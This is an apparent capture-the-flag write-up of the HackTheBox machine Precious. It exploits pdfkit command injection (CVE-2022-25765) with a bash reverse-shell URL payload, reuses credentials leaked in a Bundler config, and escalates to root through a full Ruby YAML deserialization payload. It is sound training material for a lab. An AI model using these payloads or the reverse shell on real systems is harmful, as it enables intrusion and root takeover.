---
title: HTB: Precious
url: https://0xdf.gitlab.io/2023/05/20/htb-precious.html
date: 2023-05-20T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, htb-precious, nmap, subdomain, ffuf, ruby, phusion, passenger, nginx, exiftool, pdfkit, feroxbuster, cve-2022-25765, command-injection, bundler, yaml-deserialization, youtube
---

![Precious](/img/precious-cover.png)

Precious is on the easier side of boxes found on HackTheBox. It starts with a simple web page that takes a URL and generates a PDF. I’ll use the metadata from the resulting PDF to identify the technology in use, and find a command injection exploit to get a foothold on the box. Then I’ll find creds in a Ruby Bundler configuration file to get to user. To get to root, I’ll exploit a yaml deserialization vulnerability in a script meant to manage dependencies. In Beyond Root, I’ll explore the Ruby web application, how it’s hosted, and fix the bug that doesn’t allow me to fetch a PDF of the page itself.

## Box Info

| Name | [Precious](https://hackthebox.com/machines/precious)  [Precious](https://hackthebox.com/machines/precious) [Play on HackTheBox](https://hackthebox.com/machines/precious) |
| --- | --- |
| Release Date | [26 Nov 2022](https://twitter.com/hackthebox_eu/status/1595809489004945415) |
| Retire Date | 20 May 2023 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Precious |
| Radar Graph | Radar chart for Precious |
| First Blood User | 00:06:59[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 00:12:56[irogir irogir](https://app.hackthebox.com/users/476556) |
| Creator | [Nauten Nauten](https://app.hackthebox.com/users/27582) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.189
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-17 12:53 EDT
Nmap scan report for 10.10.11.189
Host is up (0.083s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.189
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-17 12:53 EDT
Nmap scan report for 10.10.11.189
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye. There’s an HTTP redirect on port 80 to `precious.htb`.

### Subdomain Brute Force

I’ll use `ffuf` to fuzz the HTTP server for any host subdomains that return something different from the standard response. I’ll use:
- `-u` to pass the URL
- `-H "Host: FUZZ.precious.htb"` to specify the Host header, using `FUZZ` to mark where each word from the wordlist goes
- `-w` to pass a wordlist of subdomain names from [SecLists](https://github.com/danielmiessler/SecLists)
- `-mc all` to match on all HTTP status codes
- `-ac` to smart filter based on a generic response.

It doesn’t find anything else:

```

oxdf@hacky$ ffuf -u http://10.10.11.189 -H "Host: FUZZ.precious.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.189
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.precious.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 459 req/sec :: Duration: [0:00:42] :: Errors: 0 ::

```

I’ll add the domain to my `/etc/hosts` file:

```
10.10.11.189 precious.htb

```

### precious.htb - TCP 80

#### Site

The site is a single simple form:

![image-20230517130917718](/img/image-20230517130917718.png)

If I pass it `http://precious.htb`, it hangs for a second and returns:

![image-20230517131227872](/img/image-20230517131227872.png)

Either local access is blocked, it’s a DNS issue. `http://precious` and `http://127.0.0.1` return the same, so it seems like a block. I’ll note this as some thing to check when I get access, but it’s not super important at the moment other than to know I can’t get access to local stuff. I’ll fix this in [Beyond Root](#beyond-root---precious-web-server).

Similarly, URLs like `file:///etc/passwd` return an error saying it’s not a valid URL.

I’ll give it `http://10.10.14.6`, and start a Python webserver (`python -m http.server`), and there’s a hit:

```
10.10.11.189 - - [17/May/2023 13:15:28] "GET / HTTP/1.1" 200 -

```

And it returns a PDF:

![image-20230517131619579](/img/image-20230517131619579.png)

Submitting a URL sends a POST request to `/` with the POST body of `url=`:

```

POST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://precious.htb
Connection: close
Referer: http://precious.htb/
Upgrade-Insecure-Requests: 1

url=http://10.10.14.6/

```

#### Tech Stack

The HTTP headers show not only nginx, but more:

```

HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Connection: close
Status: 200 OK
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Date: Wed, 17 May 2023 17:13:03 GMT
X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
Content-Length: 483

```

It’s running Ruby, and [Phusion Passenger](https://www.phusionpassenger.com/), a web application server that supports Ruby, Python, Node, and Meteor applications.

Running `exiftool` to look at the metadata on the downloaded PDF shows a “Creator” of “Generated by pdfkit v0.8.6”:

```

oxdf@hacky$ exiftool  g1p4u6vq8iey0ixa0g5yfwhhg8ty6xx3.pdf 
ExifTool Version Number         : 12.40
File Name                       : g1p4u6vq8iey0ixa0g5yfwhhg8ty6xx3.pdf
Directory                       : .
File Size                       : 11 KiB
File Modification Date/Time     : 2023:05:17 13:15:29-04:00
File Access Date/Time           : 2023:05:17 13:25:52-04:00
File Inode Change Date/Time     : 2023:05:17 13:25:51-04:00
File Permissions                : -rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds nothing:

```

oxdf@hacky$ feroxbuster -u http://precious.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://precious.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       18c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       47l       89w      815c http://precious.htb/stylesheets/style.css
200      GET       18l       42w      483c http://precious.htb/
[####################] - 54s    30002/30002   0s      found:2       errors:0
[####################] - 53s    30000/30000   561/s   http://precious.htb/ 

```

## Shell as ruby

### Identify CVE

Searching for “pdfkit v0.8.6” returns a ton of hits about CVE-2022-25765. Many of these are based on Precious, but even if I limit the search to pages from before Precious’ launch, there’s still the same results:

![image-20230517211220602](/img/image-20230517211220602.png)

### CVE-2022-25765 Background

The [Snyk article](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) has a nice short summary of how this is exploited and shows what a vulnerable call might look like:

```

PDFKit.new("http://example.com/?name=#{params[:name]}").pdf

```

The example attack version is:

```

PDFKit.new("http://example.com/?name=#{'%20`sleep 5`'}")

```

Thinking about how the webserver might be built, it’s fair to say that it’s getting a URL from the POST request, and sending that into a call to `PDFKit.new` as shown above.

### POC

It’s not clear to me where the `#{params[:name]}` comes from. That could be a part of the POC exploit, or it could be that Ruby is parsing the URL and rebuilding it like that. As I’m not sure, it’s easy to try both. I’ll start by sending `id`. A bit of tinkering and eventually this URL works:

```

http://10.10.14.6/?name=%20`id`

```

The resulting PDF:

![image-20230517213305107](/img/image-20230517213305107.png)

It’s not completely clear to me *why* the `%20` (URL-encoded space) has to be at the start of the parameter. It seems to mostly be necessary if there are spaces in the command I’m running.

### Shell

To get a shell, I’ll change the URL to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

http://10.10.14.6/?name=%20`bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"`

```

On sending, I get a connect back at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.189 39606
bash: cannot set terminal process group (680): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$

```

And I’ll upgrade the shell using the standard `script` and `stty` [trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

ruby@precious:/var/www/pdfapp$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
ruby@precious:/var/www/pdfapp$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
ruby@precious:/var/www/pdfapp$

```

## Shell as henry

### Enumeration

#### sudo

ruby requires a password to run `sudo`:

```

ruby@precious:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for ruby:

```

Because I got a shell as ruby via an exploit, I don’t have it.

#### Home Directories

There are two user’s with home directories, ruby and henry:

```

ruby@precious:/home$ ls 
henry  ruby

```

As ruby, I can enter and list henry’s home directory (`user.txt` is there), but can’t read anything:

```

ruby@precious:/home/henry$ ls -la
total 24
drwxr-xr-x 2 henry henry 4096 Oct 26  2022 .
drwxr-xr-x 4 root  root  4096 Oct 26  2022 ..
lrwxrwxrwx 1 root  root     9 Sep 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Sep 26  2022 .bash_logout
-rw-r--r-- 1 henry henry 3526 Sep 26  2022 .bashrc
-rw-r--r-- 1 henry henry  807 Sep 26  2022 .profile
-rw-r----- 1 root  henry   33 May 16 19:01 user.txt

```

ruby’s home directory may appear empty at first, but `.bundle` is interesting:

```

ruby@precious:~$ ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 May 17 13:09 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 3 ruby ruby 4096 May 17 13:09 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile

```

#### .bundle

Bundler is a dependency management tool used in Ruby projects to manage and install the required gems and their versions. The `~/.bundle` folder holds configuration information in the `config` file, which is here:

```

ruby@precious:~$ ls .bundle/
config
ruby@precious:~$ cat .bundle/config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

```

`BUNDLE_HTTPS://RUBYGEMS__ORG/` is a key that represents a RubyGems repository URL. It indicates that the configuration applies to the `https://rubygems.org/` repository.

`"henry:Q3c1AqGHtoI0aXAYFH"` is the value associated with the key, containing the authentication credentials for accessing the RubyGems repository. In this case, the username is “henry” and the password (or API key) is “Q3c1AqGHtoI0aXAYFH”.

### su / SSH

The config file had a password for a henry user, so I’ll try it on the box with `su`, and it works:

```

ruby@precious:~$ su - henry
Password: 
henry@precious:~$

```

This also works to connect directly from my host over SSH as henry:

```

oxdf@hacky$ sshpass -p 'Q3c1AqGHtoI0aXAYFH' ssh henry@precious.htb
...[snip]...
henry@precious:~$

```

Either way, I can claim `user.txt`:

```

henry@precious:~$ cat user.txt
2bf978a0************************

```

## Shell as root

### Enumeration

henry can run a `ruby` script as root:

```

henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

```

This script is used to manager Gems (packages in Ruby):

```

require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end

```

### Unsafe Yaml

The line that is of interest here is:

```

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

```

Both [Python](https://pynative.com/python-yaml/#h-loading-a-yaml-document-safely-using-safe_load) and [Ruby](https://apidock.com/ruby/Psych/safe_load/class) have a `safe_load` function for loading YAML. This is because both had issues with the original load and deserializing the YAML payload, resulting in code execution. I showed exploiting the Python version of this for [Hackvent 2019 Day 19](/hackvent2020/hard#hv2019).

[This gist](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) has a really nice and succinct example of a payload that can be used to exploit YAML deserialization in Ruby. It’s based on this [much longer and more detailed article](https://www.elttam.com.au/blog/ruby-deserialization/).

### POC

I’ll grab the POC from the gist and paste it into a file. Wherever I save it, I’ll need to run the command from that directory:

```

henry@precious:/dev/shm$ cat dependencies.yml 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve

```

Running now shows an error, the output of `id`, and then a traceback:

```

henry@precious:/dev/shm$ sudo ruby /opt/update_dependencies.rb 
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
...[snip]...
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)

```

It’s easy to miss the `id` output with all the other lines, but it’s there, and that’s execution as root!

### Shell

To get a shell, I’ll update my payload to copy `bash` and make the copy SetUID and SetGID for root:

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf
         method_id: :resolve

```

After I run this, there’s a file at `/tmp/0xdf`:

```

henry@precious:/dev/shm$ sudo ruby /opt/update_dependencies.rb 
sh: 1: reading: not found
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
...[snip]...
henry@precious:/dev/shm$ ls -l /tmp/0xdf 
-rwsrwxrwx 1 root root 1234376 May 17 22:05 /tmp/0xdf

```

Running with `-p` gives a shell with effective UID and GID as root:

```

henry@precious:/dev/shm$ /tmp/0xdf -p
0xdf-5.1# id
uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)

```

And I can claim `root.txt`:

```

0xdf-5.1# cat root.txt
0bc3cc28************************

```

## Beyond Root - Precious Web Server

### Goals

I was able to figure out that it’s a Ruby webserver behind nginx during enumeration. In exploring, I’ll want to figure out some foundational stuff about the webserver:
- How nginx is hosting the app and how it’s redirecting to `precious.htb`;
- How the Ruby web app runs;
- What the Ruby web app does;
- Why it fails to get the local web page and export it.

### Exploration

I’ll go through these in [this video](https://www.youtube.com/watch?v=Pmdx0e6aRxU):

The short summary is that nginx is using a module named passenger. This allows nginx to handle the Ruby application. I’ll show how nginx is doing that, as well as the docs that show how that application is configured.

I’ll look at the Ruby app to see how it generates PDF and handles GET and POST requests.

I’ll also see that local hosts are not blocked, but find a DNS issue, and fix it with the `hosts` file such that I can export the main page to PDF.